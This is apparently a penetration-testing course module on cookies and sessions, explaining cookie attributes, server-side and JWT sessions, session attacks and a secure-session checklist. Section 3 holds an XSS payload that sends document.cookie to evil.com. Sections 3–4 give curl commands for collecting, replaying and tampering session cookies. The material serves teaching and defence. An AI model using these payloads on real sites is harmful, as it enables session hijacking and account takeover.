# Cookies and Sessions

## Unit 1: Web Application Fundamentals — Topic 6

## 🎯 Overview

Since HTTP is stateless, cookies and sessions provide the mechanism for maintaining user state across requests. Session management is one of the most critical areas for penetration testing — flaws in session handling lead to session hijacking, fixation, and privilege escalation. This topic covers cookie mechanics, session lifecycle, and attack techniques.

---

## 1. How Cookies Work

```
┌──────────┐                                     ┌──────────┐
│  Client  │                                     │  Server  │
│          │  1. POST /login (credentials)        │          │
│          │─────────────────────────────────────→│          │
│          │                                     │ 2. Create │
│          │  3. Set-Cookie: session=xyz789       │    session│
│          │←─────────────────────────────────────│          │
│          │                                     │          │
│ 4. Store │  5. GET /dashboard                  │          │
│   cookie │     Cookie: session=xyz789          │ 6. Lookup │
│          │─────────────────────────────────────→│    session│
│          │                                     │          │
│          │  7. HTTP 200 (user dashboard)        │          │
│          │←─────────────────────────────────────│          │
└──────────┘                                     └──────────┘
```

### Cookie Anatomy

```http
Set-Cookie: session_id=abc123def456;
            Domain=.example.com;
            Path=/;
            Expires=Thu, 15 Jan 2025 10:00:00 GMT;
            Max-Age=86400;
            Secure;
            HttpOnly;
            SameSite=Lax
```

| Attribute | Purpose | Default |
|-----------|---------|---------|
| Name=Value | Cookie identifier and data | Required |
| Domain | Which domains receive cookie | Current domain |
| Path | URL path scope | Current path |
| Expires | Absolute expiration date | Session (browser close) |
| Max-Age | Relative expiration (seconds) | Session |
| Secure | HTTPS only | Not set (sent over HTTP too) |
| HttpOnly | No JavaScript access | Not set |
| SameSite | Cross-site request control | Lax (modern browsers) |

---

## 2. Session Management Mechanisms

### Server-Side Sessions

```
┌─────────────────────────────────────────────────────────────┐
│                  SERVER-SIDE SESSIONS                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Client sends: Cookie: PHPSESSID=abc123                     │
│                                                             │
│  Server lookup:                                              │
│  ┌──────────────────────────────────────────┐               │
│  │  Session Store (Memory/Redis/DB)         │               │
│  │  ┌────────┬─────────────────────────┐    │               │
│  │  │ abc123 │ user_id: 42             │    │               │
│  │  │        │ role: admin             │    │               │
│  │  │        │ login_time: 1705312200  │    │               │
│  │  │        │ cart: [item1, item2]    │    │               │
│  │  └────────┴─────────────────────────┘    │               │
│  └──────────────────────────────────────────┘               │
│                                                             │
│  Only session ID transmitted, data stays on server          │
└─────────────────────────────────────────────────────────────┘
```

### Client-Side Sessions (JWT)

```
┌─────────────────────────────────────────────────────────────┐
│                  CLIENT-SIDE SESSIONS (JWT)                   │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Token: eyJhbGci.eyJ1c2VyIjoi.SflKxwRJ                    │
│         ─────────.───────────────.──────────                │
│         Header    Payload         Signature                  │
│                                                             │
│  Header:  {"alg":"HS256","typ":"JWT"}                       │
│  Payload: {"user":"admin","role":"user","exp":1705398600}   │
│  Signature: HMACSHA256(header.payload, secret)              │
│                                                             │
│  ⚠ All data is client-side — tamper if signature is weak!   │
└─────────────────────────────────────────────────────────────┘
```

---

## 3. Session Attack Vectors

### Session Hijacking

```
┌──────────┐         ┌──────────┐         ┌──────────┐
│  Victim  │         │ Attacker │         │  Server  │
│          │         │          │         │          │
│  Normal  │         │ Steal    │         │          │
│  browsing│         │ session  │         │          │
│          │──XSS──→│ cookie   │         │          │
│          │         │          │         │          │
│          │         │ GET /dashboard     │          │
│          │         │ Cookie: session=   │          │
│          │         │ [stolen_value]     │          │
│          │         │─────────────────→  │          │
│          │         │                    │ Returns  │
│          │         │←─────────────────  │ victim's │
│          │         │ Victim's dashboard │ data     │
└──────────┘         └──────────┘         └──────────┘
```

```javascript
// XSS cookie theft (if HttpOnly not set)
<script>
new Image().src="https://evil.com/steal?c="+document.cookie;
</script>

// Network sniffing (if Secure not set)
// Attacker on same network captures HTTP cookie
```

### Session Fixation

```
┌──────────────────────────────────────────────────────────────┐
│                    SESSION FIXATION ATTACK                     │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  1. Attacker gets valid session: SESS=attacker_session_id    │
│                                                              │
│  2. Attacker sends link to victim:                           │
│     https://target.com/login?PHPSESSID=attacker_session_id   │
│                                                              │
│  3. Victim clicks link and logs in                           │
│     Server associates victim's auth with attacker_session_id │
│                                                              │
│  4. Attacker uses same session ID → logged in as victim!     │
│                                                              │
│  Prevention: Regenerate session ID after login               │
└──────────────────────────────────────────────────────────────┘
```

### Session Prediction

```bash
# Weak session IDs (predictable patterns)
# Sequential:    sess001, sess002, sess003
# Timestamp:     1705312200, 1705312201
# MD5(username): 21232f297a57a5a743894a0e4a801fc3

# Testing session randomness
# Collect 100+ session IDs and analyze:
for i in $(seq 1 100); do
  curl -s -c - https://target.com/login | grep session
done > sessions.txt

# Look for patterns:
# - Sequential increments
# - Timestamp-based values
# - Short length (brute-forceable)
# - Limited character set
```

---

## 4. Cookie Testing Methodology

```bash
# 1. Inspect cookie attributes
curl -v https://target.com/login 2>&1 | grep -i set-cookie

# 2. Check for missing security flags
# Missing Secure → works over HTTP
curl http://target.com -v 2>&1 | grep Cookie

# Missing HttpOnly → accessible via JavaScript
# Check in browser: document.cookie

# Missing SameSite → CSRF possible

# 3. Test cookie scope
# Domain=.example.com → all subdomains receive cookie
# Path=/ → entire site

# 4. Test session lifecycle
# Login → get session → logout → reuse session
curl -b "session=old_token" https://target.com/dashboard
# If still valid → session not properly invalidated

# 5. Cookie tampering
# Decode cookie value (Base64, URL encoding)
echo "dXNlcj1hZG1pbg==" | base64 -d
# user=admin

# Modify and re-encode
echo -n "user=admin;role=superadmin" | base64
```

---

## 5. Common Session Vulnerabilities

| Vulnerability | Description | Test |
|--------------|-------------|------|
| No HttpOnly | JS can read cookies | `document.cookie` in console |
| No Secure flag | Cookie sent over HTTP | Access site via HTTP |
| Weak session ID | Predictable/short tokens | Collect and analyze patterns |
| No regeneration | Same ID after login | Compare pre/post login |
| No expiration | Session never expires | Wait and reuse token |
| No logout invalidation | Server doesn't destroy session | Reuse token after logout |
| Cookie scope too broad | Subdomains can access | Check Domain attribute |
| Sensitive data in cookie | PII stored client-side | Decode cookie values |

---

## 6. Secure Session Implementation

```
┌──────────────────────────────────────────────────────────────┐
│              SECURE SESSION CHECKLIST                          │
├──────────────────────────────────────────────────────────────┤
│  ✓ Generate cryptographically random session IDs (128+ bits) │
│  ✓ Set Secure, HttpOnly, SameSite flags                     │
│  ✓ Regenerate session ID after authentication               │
│  ✓ Implement absolute and idle session timeouts              │
│  ✓ Invalidate session on server-side during logout           │
│  ✓ Don't expose session ID in URLs                          │
│  ✓ Use HTTPS for all authenticated pages                     │
│  ✓ Bind session to user attributes (IP, User-Agent)         │
└──────────────────────────────────────────────────────────────┘
```

---

## 📊 Summary Table

| Attack | Prerequisite | Impact | Prevention |
|--------|-------------|--------|------------|
| Session Hijacking | XSS or network sniffing | Full account takeover | HttpOnly, Secure, HTTPS |
| Session Fixation | Session in URL/form | Account access | Regenerate after auth |
| Session Prediction | Weak random generation | Account access | Crypto-random IDs |
| Cookie Tampering | Client-side data | Privilege escalation | Server-side sessions |
| CSRF via Cookies | No SameSite | Unauthorized actions | SameSite=Strict |

---

## ❓ Revision Questions

1. What is the difference between server-side and client-side sessions?
2. How does session fixation differ from session hijacking?
3. What cookie attributes prevent XSS-based session theft?
4. Why should session IDs be regenerated after authentication?
5. How can you test whether a session is properly invalidated on logout?
6. What makes a session ID cryptographically secure?

---

*Previous: [05-security-headers.md](05-security-headers.md) | Next: [07-same-origin-policy.md](07-same-origin-policy.md)*

---

*[Back to README](../README.md)*
